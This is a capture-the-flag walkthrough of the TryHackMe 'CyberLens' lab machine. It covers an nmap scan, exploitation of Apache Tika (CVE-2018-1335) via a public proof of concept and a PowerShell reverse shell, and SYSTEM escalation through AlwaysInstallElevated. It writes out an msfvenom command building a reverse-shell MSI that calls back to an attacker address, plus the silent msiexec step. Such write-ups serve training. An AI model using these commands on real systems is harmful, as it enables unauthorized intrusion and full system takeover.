# THM - CyberLens

### Ip: 10.10.126.76
### Name: CyberLens
### Rating: Easy

------------------------------------------------

thm_cyberlens_pic.svg

### Challenge Description

```
Welcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image. As you embark on this thrilling journey, prepare to unveil the hidden matrix of information that lurks beneath the surface, for here at CyberLens, we make metadata our playground.

In this labyrinthine realm of cyber security, we have mastered the arcane arts of digital forensics and image analysis. Armed with advanced techniques and cutting-edge tools, we delve into the very fabric of digital images, peeling back layers of information to expose the unseen stories they yearn to tell.

Picture yourself as a modern-day investigator, equipped not only with technical prowess but also with a keen eye for detail. Our team of elite experts will guide you through the intricate paths of image analysis, where file structures and data patterns provide valuable insights into the origins and nature of digital artifacts.

At CyberLens, we believe that every pixel holds a story, and it is our mission to decipher those stories and extract the truth. Join us on this exciting adventure as we navigate the digital landscape and uncover the hidden narratives that await us at every turn.

Can you exploit the CyberLens web server and discover the hidden flags? 
```

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/THM/CyberLens]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.10.126.76
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-15 10:20 CST
Warning: 10.10.126.76 giving up on port because retransmission cap hit (10).
Nmap scan report for cyberlens.thm (10.10.126.76)
Host is up (0.13s latency).
Not shown: 65408 closed tcp ports (reset), 111 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.57 ((Win64))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.57 (Win64)
|_http-title: CyberLens: Unveiling the Hidden Matrix
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2025-01-15T16:22:01+00:00
|_ssl-date: 2025-01-15T16:22:07+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=CyberLens
| Not valid before: 2025-01-14T16:05:07
|_Not valid after:  2025-07-16T16:05:07
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
| http-methods: 
|_  Potentially risky methods: PUT
|_http-cors: HEAD GET
|_http-title: Site doesn't have a title (text/plain).
|_http-server-header: Jetty(8.y.z-SNAPSHOT)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-01-15T16:21:59
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.61 seconds
```

Let's add cyberlens.thm to `/etc/hosts`.

Looking at the site we find a file upload that seems to extract metadata from images:

thm_cyberlens_site.png

I uploaded a copy of the screenshot above and it returned it's metadata:

thm_cyberlens_meta.png

Looking at port 61777 at http://cyberlens.thm:61777/ we find it is running Tika:

thm_cyberlense_tika.png

### Exploitation

Looking for exploits against Tika I find interesting writeup: https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/

Which also has a helpful POC script at: https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2018-1335

We can use this exploit script alongside a Base64 encoded PowerShell reverse shell oneliner from revshells.com and get a callback:

thm_cyberlens_shell.png

We can now grab the user.txt flag:

thm_cyberlens_user.png

### Privilege Escalation

We can load up PowerUp.ps1 to help enumerate a privilege escalation vector:

thm_cyberlens_powerup.png

Cool, looks like AlwaysInstallElevated is enabled.

We can manually confirm with:

```
PS C:\temp> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

PS C:\temp> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Let's now create a malicious reverse shell .msi file:

```
┌──(ryan㉿kali)-[~/THM/CyberLens]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.72.91 LPORT=443 -f msi -o reverse.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: reverse.msi
```

Once the file is transferred to the target we can set up a nc listener and run: `msiexec /quiet /qn /i reverse.msi`

Which catches us a shell back as system:

thm_cyberlens_system.png

And we can now grab the final flag:

thm_cyberlens_root.png

Thanks for following along!

-Ryan

-------------------------------------------------